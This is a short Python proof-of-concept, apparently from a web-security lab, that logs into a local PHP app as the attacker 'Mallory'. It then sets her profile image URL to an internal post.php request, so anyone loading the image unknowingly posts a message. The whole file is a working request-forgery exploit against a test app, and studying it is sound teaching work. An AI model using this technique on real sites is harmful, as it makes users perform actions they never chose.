import os, requests, urllib

PROTOCOL = "http"
HOST = "localhost"
PORT = "8080"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': 'mallory@example.com',
    'password': 'pass4mallory'
}

with requests.Session() as s:
    # sing-in as mallory
    res = s.post(BASE + '/signin.php', data=mallory)
    
    # change profile picture (using a url)
    data = {'optionsimagetype' : 'url'
            , 'url' : BASE + '/post.php?msg=Mallory%20is%20a%20trustworthy%20person!'}
    s.post(BASE + '/profile.php', data=data)
